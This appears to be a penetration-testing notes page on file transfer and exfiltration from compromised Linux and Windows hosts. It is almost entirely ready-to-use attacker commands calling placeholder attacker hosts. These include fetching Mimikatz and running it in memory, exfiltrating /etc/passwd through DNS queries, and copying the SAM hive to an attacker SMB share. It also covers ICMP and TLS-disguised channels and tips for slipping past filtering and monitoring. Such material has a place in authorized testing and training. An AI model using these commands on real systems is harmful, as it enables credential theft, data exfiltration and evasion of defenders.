+++
title = 'File Transfers'
date = 2026-10-30
type = 'notes'
weight = 30
toc = true
tags = ['utilities', 'payloads', 'file-transfer']
+++

Moving a tool onto a target and pulling loot off it is a prerequisite for almost every other phase. This file covers transfers in both directions, on both Linux and Windows, with an emphasis on methods that work when `wget`, `curl`, `ssh`, and `nc` are missing, blocked, or monitored.

---

## 1. Basic Methods (Linux)

| Command | Description |
|---|---|
| `cat file \| base64 -w 0; echo` | Encode a file to a single base64 line for copy-paste |
| `echo 'BASE64' \| base64 -d > file` | Decode on the other side |
| `wget http://ATTACKER/file -O /tmp/file` | Download with `wget` |
| `curl http://ATTACKER/file -o /tmp/file` | Download with `curl` |
| `python3 -m http.server 80` | Start a quick HTTP server on the attacker box |

**When `wget`/`curl` are missing:**

```bash
# Bash built-in /dev/tcp (no external binary needed)
exec 3<>/dev/tcp/ATTACKER/80
echo -e "GET /file HTTP/1.1\r\nHost: ATTACKER\r\n\r\n" >&3
cat <&3 > /tmp/file

# Python one-liner
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER/file','/tmp/file')"

# Perl
perl -e 'use LWP::Simple; getstore("http://ATTACKER/file","/tmp/file")'

# PHP
php -r '$f=file_get_contents("http://ATTACKER/file"); file_put_contents("/tmp/file",$f);'
```

---

## 2. Uploading Files (Linux → Attacker)

Downloads are easy; **uploads** are the part that usually fails because `python3 -m http.server` answers `POST` with `501 Unsupported method`.

### `curl` — HTTP POST

From GTFOBins, `curl` can exfiltrate a file with an HTTP `POST`:

```bash
# Attacker: start a receiver that accepts POST bodies
python3 -m uploadserver 8000          # pip install uploadserver
# or: nc -lvnp 8000 > received_file

# Target: send the file
curl -X POST -d @/path/to/file http://ATTACKER:8000/
```

The file is sent as-is; instruct the receiver not to URL-decode the body. Omit the `@` to send hard-coded data.

### `wget` — `--post-file`

`wget` can also upload, using `--post-file`:

```bash
wget --post-file=/path/to/file http://ATTACKER:8000/upload
```

> **Note:** `wget` sends `application/x-www-form-urlencoded`, not `multipart/form-data`. For a real form upload, use `curl -F`.

### `curl` — multipart form (`-F`)

When the receiver expects a form field:

```bash
curl -F "file=@/path/to/file" http://ATTACKER:8000/upload
```

### Base64 over the shell (no HTTP needed)

If you have a shell but no outbound HTTP:

```bash
base64 -w 0 /path/to/file
# copy the output, then locally:
echo 'BASE64' | base64 -d > file
```

For large files, chunk it:

```bash
split -b 1000 file chunk_
for f in chunk_*; do echo "$f:$(base64 -w 0 "$f")"; done
```

---

## 3. SSH-Based Transfers

| Command | Description |
|---|---|
| `scp file user@target:/tmp/file` | Upload via SCP |
| `scp user@target:/tmp/file .` | Download via SCP |
| `rsync -avz file user@target:/tmp/` | Rsync over SSH |
| `sftp user@target` | Interactive SFTP |

**When `scp` is blocked but SSH is open**, use the SSH connection as a raw pipe:

```bash
# Download
ssh user@target 'cat /path/to/file' > local_file

# Upload
cat local_file | ssh user@target 'cat > /path/to/file'
```

This works over the same port 22 and is harder to block than `scp`.

---

## 4. Netcat and Socat

### `nc` (traditional)

**Case 1 — Target listens, attacker sends (download to target):**

```bash
# Target
nc -l -p 8000 > SharpKatz.exe
# Attacker
nc -q 0 TARGET_IP 8000 < SharpKatz.exe
```

**Case 2 — Attacker listens, target sends (upload to attacker):**

```bash
# Attacker
nc -lvnp 8000 > loot.zip
# Target
nc ATTACKER_IP 8000 < loot.zip
```

### `ncat` (Nmap’s variant)

```bash
# Target
ncat -l -p 8000 --recv-only > file
# Attacker
ncat --send-only TARGET_IP 8000 < file
```

### `socat` — the `netcat++`

`socat` establishes two bidirectional byte streams and transfers data between them; channels can be files, pipes, devices, or sockets (Unix, TCP, UDP, SSL). It is the better choice when `nc` is absent or when you need TLS.

```bash
# Attacker listens, writes to a file
socat TCP-LISTEN:8000,reuseaddr,fork OPEN:received_file,creat,append

# Target sends
socat TCP:ATTACKER_IP:8000 OPEN:/path/to/file

# With TLS
socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0 OPEN:received_file,creat,append
```

---

## 5. Encrypted Transfers with `openssl s_client`

When traffic is inspected and plaintext HTTP/TCP is risky, `openssl s_client` provides an encrypted channel that looks like TLS. The GTFOBins `openssl` page documents both directions.

### Upload (target → attacker)

```bash
# Attacker: start a TLS server that writes to a file
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > received_file

# Target: send the file
openssl s_client -quiet -connect ATTACKER_IP:12345 < /path/to/file
```

### Download (attacker → target)

```bash
# Attacker: start a TLS server that serves a file
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send

# Target: receive the file
openssl s_client -quiet -connect ATTACKER_IP:12345 > /tmp/file
```

The transmission is encrypted, and the traffic is indistinguishable from ordinary TLS on the wire.

---

## 6. Tunnels That Double as Transfer Paths

Once a tunnel is established for pivoting, it can also carry files — which is useful when the target can only reach the attacker through an internal pivot.

### Ligolo-ng

Ligolo-ng creates a **TUN interface** on the attacker and establishes a reverse TCP/TLS tunnel through the agent. It has built-in `upload` and `download` commands and a `listener` mechanism for exposing attacker-side services to the agent network:

```bash
# Agent (target)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Attacker (ligolo-ng proxy console)
listener_add --addr 0.0.0.0:9002 --to 127.0.0.1:9002
listener_start --listener 1

# On the target, download from the attacker's HTTP server through the tunnel
wget http://<ligolo-tunnel-ip>:9002/tool
```

Ligolo-ng is generally faster and more flexible than Chisel, supports full TCP (not just SOCKS), and has largely displaced Chisel for pivoting in recent years.

### Chisel

Chisel is a single Go binary that tunnels TCP/UDP over **HTTP/WebSocket**, which passes through most egress filtering and proxies. The most useful mode for file transfer is a **reverse SOCKS proxy**:

```bash
# Attacker: server with reverse SOCKS
chisel server --port 8080 --reverse --socks5

# Target: client connecting back
./chisel client ATTACKER_IP:8080 R:socks
```

Point `proxychains` at the local SOCKS port, then use normal `curl`/`wget` through the proxy:

```bash
proxychains curl http://internal-host/file -o /tmp/file
```

Chisel is the fallback when SSH is unavailable on the pivot and the egress filter is strict.

---

## 7. Exfiltration When HTTP Is Blocked

### DNS exfiltration

DNS is frequently allowed outbound even when HTTP is blocked. Encode data in a subdomain and query it:

```bash
# Single-shot (small files)
dig "$(cat /etc/passwd | base64 -w0).ATTACKER.com"

# Chunked (larger files) — split into 63-byte labels
base64 -w 0 file | fold -w 63 | while read chunk; do
    dig "${chunk}.ATTACKER.com"
done
```

On the attacker side, run a DNS server that logs queries, or use `tcpdump`:

```bash
sudo tcpdump -i any -n port 53
```

### ICMP exfiltration

When DNS is also filtered, ICMP echo requests often survive:

```bash
# Simple: encode data in the payload of a ping
ping -c 1 -p "$(xxd -p -l 16 file)" ATTACKER_IP
```

For bulk transfer, use a dedicated tool such as `icmpsh` or `ptunnel`.

> **Note:** DNS and ICMP exfiltration are slow (tens of KB/s at best) and noisy in logs. Use them for credentials and small loot, not for transferring a 50 MB tool.

---

## 8. Windows File Transfers (Original Content, Preserved)

### PowerShell

```powershell
# Download
Invoke-WebRequest https://ATTACKER/PowerView.ps1 -OutFile PowerView.ps1
# Download with a Chrome user-agent (avoids some filters)
Invoke-WebRequest http://ATTACKER/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile nc.exe
# Execute in memory
IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER/Invoke-Mimikatz.ps1')
```

### PowerShell upload

`python3 -m http.server` cannot receive uploads; use `uploadserver`:

```bash
# Kali
python3 -m uploadserver 80
```

```powershell
# Target
$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\nc.exe"))
Invoke-RestMethod -Uri http://ATTACKER/upload -Method Post -Body $b64
```

### `bitsadmin` and `certutil`

```cmd
bitsadmin /transfer n http://ATTACKER/nc.exe C:\Temp\nc.exe
certutil.exe -verifyctl -split -f http://ATTACKER/nc.exe
```

### PHP

```bash
php -r '$file = file_get_contents("https://ATTACKER/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

### Pulling loot back to Kali

```bash
# SMB
sudo impacket-smbserver loot /tmp/loot -smb2support
# then on Windows:
copy C:\sam.save \\ATTACKER\loot\
```

```cmd
:: HTTP with uploadserver
curl.exe -X POST --data-binary @C:\sam.save http://ATTACKER:8000/up
```

```cmd
:: Netcat
nc.exe ATTACKER 8000 < loot.zip
```

---

## 9. SMB and RDP (Windows)

### Fake SMB server

```bash
sudo impacket-smbserver sharename /tmp/smbshare -smb2support
# Anonymous download on Windows:
copy \\ATTACKER\sharename\nc.exe .

# Authenticated
sudo impacket-smbserver sharename /tmp/smbshare -smb2support -user test -password test
net use n: \\ATTACKER\sharename /user:test test
```

### RDP shares and clipboard

```bash
xfreerdp /v:IP /u:user /p:password +home-drive
xfreerdp /v:IP /u:user /p:password /drive:share_name,/path/to/directory
xfreerdp /v:IP /u:user /p:password +clipboard
```

---

## 10. Choosing a Method — Decision Table

| Situation | First choice | Fallback |
|---|---|---|
| Outbound HTTP allowed, `curl`/`wget` present | `python3 -m http.server` + `wget`/`curl` | Base64 over shell |
| Outbound HTTP allowed, no `curl`/`wget` | `bash /dev/tcp` or Python/Perl one-liner | `socat` |
| Need to **upload** from target | `curl -X POST -d @file` or `wget --post-file` | `nc` reverse listener |
| SSH open but `scp`/`sftp` blocked | `ssh 'cat file' > local` | `rsync` over SSH |
| Traffic inspected | `openssl s_client` / `s_server` | `socat OPENSSL` |
| Only internal pivot reachable | Ligolo-ng `listener` / `upload` | Chisel reverse SOCKS + proxychains |
| HTTP and DNS filtered | ICMP exfil | DNS over TCP/53 |
| Windows target | PowerShell `Invoke-WebRequest` | `bitsadmin` / `certutil` |
| Need to pull loot from Windows | SMB (`impacket-smbserver`) | `curl.exe -X POST` to `uploadserver` |

---

## 11. Quick Reference — One-Liners

```bash
# Download (Linux)
wget http://ATTACKER/f -O /tmp/f
curl http://ATTACKER/f -o /tmp/f
python3 -c "import urllib.request;urllib.request.urlretrieve('http://ATTACKER/f','/tmp/f')"

# Upload (Linux)
curl -X POST -d @/path/to/file http://ATTACKER:8000/
wget --post-file=/path/to/file http://ATTACKER:8000/
cat file | ssh user@ATTACKER 'cat > /tmp/file'

# Base64 round-trip
base64 -w0 file
echo 'BASE64' | base64 -d > file

# Netcat
nc -lvnp 8000 > loot
nc ATTACKER 8000 < loot

# Socat
socat TCP-LISTEN:8000,reuseaddr,fork OPEN:loot,creat,append
socat TCP:ATTACKER:8000 OPEN:file

# Encrypted (openssl)
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > loot
openssl s_client -quiet -connect ATTACKER:12345 < file

# DNS exfil
dig "$(base64 -w0 file).ATTACKER.com"

# Tunnel
ligolo-ng: listener_add --addr 0.0.0.0:9002 --to 127.0.0.1:9002
chisel client ATTACKER:8080 R:socks
```

---

## 12. Field Notes

- **`python3 -m http.server` cannot receive uploads.** It returns `501` for `POST`. Use `uploadserver`, `nc`, or `socat` on the receiving side.
- **Check which interpreters exist before assuming a method.** `which python3 python perl php ruby node nc ncat socat openssl rsync` tells you what is actually available.
- **`scp` being blocked does not mean SSH is blocked.** `ssh 'cat file' > local` and `cat file | ssh 'cat > remote'` work over the same port.
- **Ligolo-ng and Chisel are transfer tools as much as pivoting tools.** A tunnel that lets you reach an internal host also lets you serve files to it and receive files from it.
- **DNS and ICMP are slow but rarely filtered.** Reserve them for credentials and small loot, not for moving tools.
- **Base64 in a shell is the universal fallback.** If you have a prompt and can copy text, you can move a file — `base64 -w0` on one side, `base64 -d` on the other.

---
